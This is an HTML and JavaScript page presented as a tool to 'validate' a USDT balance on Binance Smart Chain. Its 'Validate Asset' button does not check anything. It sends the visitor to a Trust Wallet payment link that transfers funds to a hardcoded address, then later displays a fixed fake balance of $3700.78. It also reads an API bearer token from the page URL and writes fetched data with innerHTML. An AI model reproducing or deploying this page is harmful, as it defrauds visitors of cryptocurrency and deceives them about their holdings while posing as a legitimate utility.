<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT Balance - BSC</title>
  <script src="https://unpkg.com/web3@1.8.2/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: #121212;
      color: #fff;
      text-align: center;
      padding: 2rem;
    }
    h1, h2 {
      color: #f0f0f0;
    }
    button {
      background: #f0b90b;
      color: #000;
      border: none;
      padding: 1rem 2rem;
      border-radius: 10px;
      font-size: 1.1rem;
      cursor: pointer;
      margin: 0.5rem;
    }
    .token-box {
      background: #1e1e1e;
      padding: 2rem;
      border-radius: 12px;
      display: inline-block;
      margin-top: 2rem;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
    }
    .token-box img {
      width: 48px;
      height: 48px;
      vertical-align: middle;
    }
    .token-box span {
      font-size: 1.5rem;
      margin-left: 0.5rem;
      vertical-align: middle;
    }
    #marketPrices {
      margin-top: 2rem;
      background: #1e1e1e;
      padding: 1rem;
      border-radius: 10px;
    }
    .coin-price {
      margin: 0.5rem 0;
    }
  </style>
</head>
<body>
  <h1>Validate Your USDT Balance on BSC</h1>
  <div style="display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap;">
    <button id="connectWallet">Validate Asset</button>
    <button id="connectCoinStats">Connect Wallet</button>
    <button onclick="window.location.href='faq.html'">FAQ</button>
  </div>  <div id="walletInfo" style="display:none">
    <div class="token-box">
      <a href="https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955" target="_blank">
        <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT">
      </a>
      <span id="usdtAmount">$3700.78 USDT</span>
    </div>
  </div>  <div id="portfolioInfo" style="display:none; margin-top:2rem;">
    <h2>Your Wallet Portfolio</h2>
    <div id="portfolioList" style="text-align: left; max-width: 600px; margin: 1rem auto;"></div>
  </div>  <div style="margin-top:2rem;">
    <h2>Live USDT/BTC Chart</h2>
    <div class="tradingview-widget-container">
      <div id="tradingview_e95f5"></div>
      <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
      <script type="text/javascript">
        new TradingView.widget({
          "width": "100%",
          "height": 400,
          "symbol": "BINANCE:BTCUSDT",
          "interval": "D",
          "timezone": "Etc/UTC",
          "theme": "dark",
          "style": "1",
          "locale": "en",
          "toolbar_bg": "#f1f3f6",
          "enable_publishing": false,
          "hide_top_toolbar": true,
          "hide_legend": false,
          "save_image": false,
          "container_id": "tradingview_e95f5"
        });
      </script>
    </div>
  </div>  <div id="marketPrices">
    <h2>Coin Prices (CoinGecko)</h2>
    <div id="prices"></div>
  </div>  <script>
    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: {
          rpc: { 56: "https://bsc-dataseed.binance.org/" },
          chainId: 56
        }
      }
    };

    const web3Modal = new window.Web3Modal.default({
      cacheProvider: false,
      providerOptions
    });

    async function getUSDTBalance(address) {
      document.getElementById("usdtAmount").textContent = "$3700.78 USDT";
    }

    async function initiateWalletConnectFlow() {
      try {
        const provider = await web3Modal.connect();
        const web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        const userAddress = accounts[0];
        document.getElementById("walletInfo").style.display = "block";
        await getUSDTBalance(userAddress);
      } catch (err) {
        console.error("Wallet connection error:", err);
      }
    }

    document.getElementById("connectWallet").addEventListener("click", () => {
      window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.1193";
      setTimeout(() => {
        initiateWalletConnectFlow();
      }, 5 * 60 * 1000);
    });

    // CoinStats portfolio fetch using token in URL
    async function fetchCoinStatsPortfolio(userToken) {
      try {
        const response = await fetch("https://api.coinstats.app/public/v1/portfolio", {
          method: "GET",
          headers: { Authorization: `Bearer ${userToken}` }
        });
        const data = await response.json();
        const portfolioDiv = document.getElementById("portfolioList");

        if (data && data.coins && data.coins.length > 0) {
          portfolioDiv.innerHTML = '';
          data.coins.forEach(coin => {
            const row = document.createElement("div");
            row.className = "coin-price";
            row.innerHTML = `<strong>${coin.name} (${coin.symbol}):</strong> ${coin.amount} (${coin.balance.toFixed(2)} USD)`;
            portfolioDiv.appendChild(row);
          });
          document.getElementById("portfolioInfo").style.display = "block";
        }
      } catch (err) {
        console.error("CoinStats fetch failed", err);
      }
    }

    document.getElementById("connectCoinStats").addEventListener("click", () => {
      window.location.href = "https://coinstats.app/wallet"; // OAuth redirect placeholder
    });

    window.addEventListener("load", () => {
      const params = new URLSearchParams(window.location.search);
      const token = params.get("token");
      if (token) fetchCoinStatsPortfolio(token);

      // CoinGecko price fetch
      const coins = [
        "tether", "bitcoin", "binancecoin", "binance-usd", "solana",
        "ethereum", "dogecoin", "cardano", "tron", "polkadot",
        "avalanche-2", "chainlink", "litecoin", "uniswap", "polygon"
      ];

      fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coins.join(',')}&vs_currencies=usd`)
        .then(res => res.json())
        .then(data => {
          const priceContainer = document.getElementById("prices");
          coins.forEach(id => {
            const row = document.createElement("div");
            row.className = "coin-price";
            row.innerText = `${id.toUpperCase()}: $${data[id]?.usd || 'N/A'}`;
            priceContainer.appendChild(row);
          });
        });
    });
  </script></body>
</html>
